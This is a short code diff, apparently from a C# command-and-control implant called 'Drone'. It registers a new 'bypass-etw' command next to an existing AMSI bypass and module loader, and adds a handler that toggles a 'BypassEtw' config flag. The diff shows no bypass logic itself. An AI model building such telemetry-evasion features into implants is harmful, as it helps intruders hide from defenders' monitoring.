@@ -21,12 +21,16 @@ namespace Drone.Modules
             var amsi = new Command("bypass-amsi", "Bypass AMSI for post-ex tasks", BypassAmsi);
             amsi.Arguments.Add(new Command.Argument("true/false"));
 
+            var etw = new Command("bypass-etw", "Bypass etw for post-ex tasks", BypassEtw);
+            etw.Arguments.Add(new Command.Argument("true/false"));
+
             var load = new Command("load-module", "Load an external Drone module", LoadModule);
             load.Arguments.Add(new Command.Argument("/path/to/module.dll", false, true));
 
             Commands.Add(sleep);
             Commands.Add(load);
             Commands.Add(amsi);
+            Commands.Add(etw);
             Commands.Add(exit);
         }
 
@@ -46,7 +50,17 @@ namespace Drone.Modules
             var current = Config.GetConfig<bool>("BypassAmsi");
             Drone.SendResult(task.TaskGuid, current.ToString());
         }
-        
+
+        private void BypassEtw(DroneTask task, CancellationToken token)
+        {
+            if (task.Arguments.Length > 0)
+                Config.SetConfig("BypassEtw", bool.Parse(task.Arguments[0]));
+
+            var current = Config.GetConfig<bool>("BypassEtw");
+            Drone.SendResult(task.TaskGuid, current.ToString());
+        }
+
+
         private void ExitDrone(DroneTask task, CancellationToken token)
         {
             Drone.Stop();
